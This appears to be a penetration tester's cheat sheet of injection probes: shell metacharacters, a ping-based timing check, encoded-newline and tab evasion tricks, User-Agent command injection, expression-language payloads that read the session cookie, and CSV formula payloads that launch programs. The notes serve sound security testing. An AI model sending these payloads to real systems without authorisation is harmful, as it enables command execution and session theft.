shell metacharacters
  ;
  |
  ||
  &
  &&
  \n
  <
  >
  $()

test w/ ping -n 30 127.1 to cause delay (indicates command running even if no browser output)

replace delimiters with
  %0a 
  %0d%0a

replace spaces with tabs

Check for OS command injection in UserAgent

EL tests
  ${"eltest"}
  #{"eltest"}
  ${99999+1}
  #{99999+1}
  ${cookie['JSESSIONID'].value}

CSV injection
	`=cmd|' /C notepad'!'A1'` 	#note - likely filtered against
	`@SUM(1+9)*cmd|' /C calc'!A0`
